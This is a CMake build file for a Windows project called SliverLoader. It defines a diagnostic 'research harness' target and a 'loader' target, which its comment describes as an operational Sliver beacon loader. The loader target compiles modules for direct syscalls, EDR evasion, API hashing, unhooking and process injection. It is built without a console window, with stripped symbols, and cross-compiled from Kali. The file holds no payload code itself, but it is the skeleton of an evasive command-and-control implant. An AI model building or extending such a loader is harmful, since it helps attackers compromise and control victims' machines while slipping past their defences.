cmake_minimum_required(VERSION 3.24)
project(SliverLoader LANGUAGES CXX)

if(NOT WIN32)
    message(FATAL_ERROR "SliverLoader is intended for Windows builds only.")
endif()

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# ---------------------------------------------------------------------------
# Research Harness target (original diagnostic tool)
# ---------------------------------------------------------------------------
add_executable(research_harness
    app/main_research.cpp
    src/native/native_api.cpp
    src/integrity/process_enum.cpp
    src/integrity/export_parser.cpp
    src/integrity/hook_scanner.cpp
    src/net/url.cpp
    src/net/http_client_winsock.cpp
    src/telemetry/report.cpp
)

target_include_directories(research_harness PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/app
    ${CMAKE_CURRENT_SOURCE_DIR}/include
)

target_compile_definitions(research_harness PRIVATE
    UNICODE
    _UNICODE
    NOMINMAX
    WIN32_LEAN_AND_MEAN
    _WIN32_WINNT=0x0A00
)

if(MSVC)
    target_compile_options(research_harness PRIVATE
        /W4
        /permissive-
        /EHsc
        /guard:cf
        /Qspectre
    )
    target_link_options(research_harness PRIVATE
        /DYNAMICBASE
        /HIGHENTROPYVA
        /NXCOMPAT
    )
endif()

target_link_libraries(research_harness PRIVATE ws2_32)

if(NOT MSVC)
    target_compile_options(research_harness PRIVATE -municode)
    target_link_options(research_harness PRIVATE -municode)
endif()

# ---------------------------------------------------------------------------
# Loader target (operational Sliver beacon loader)
# ---------------------------------------------------------------------------
add_executable(loader
    app/config.hpp
    app/main_loader.cpp
    src/native/native_api.cpp
    src/integrity/export_parser.cpp
    src/net/url.cpp
    src/net/http_client_winsock.cpp
    src/syscall/syscall.cpp
    src/evasion/evasion.cpp
    src/api_hash/api_hash.cpp
    src/unhook/unhook.cpp
    src/inject/inject.cpp
)

target_include_directories(loader PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/app
    ${CMAKE_CURRENT_SOURCE_DIR}/include
)

target_compile_definitions(loader PRIVATE
    NOMINMAX
    WIN32_LEAN_AND_MEAN
    _WIN32_WINNT=0x0A00
)

if(MSVC)
    target_compile_options(loader PRIVATE
        /W4
        /permissive-
        /EHsc
    )
    target_link_options(loader PRIVATE
        /SUBSYSTEM:WINDOWS
        /DYNAMICBASE
        /HIGHENTROPYVA
        /NXCOMPAT
    )
else()
    # MinGW-w64 cross-compile from Kali
    target_compile_options(loader PRIVATE
        -fno-exceptions
        -fno-rtti
        -O3
        -Os
        -s
        -fvisibility=hidden
    )
    target_link_options(loader PRIVATE
        -mwindows
        -s
        -static-libgcc
        -static-libstdc++
    )
endif()

target_link_libraries(loader PRIVATE ws2_32)
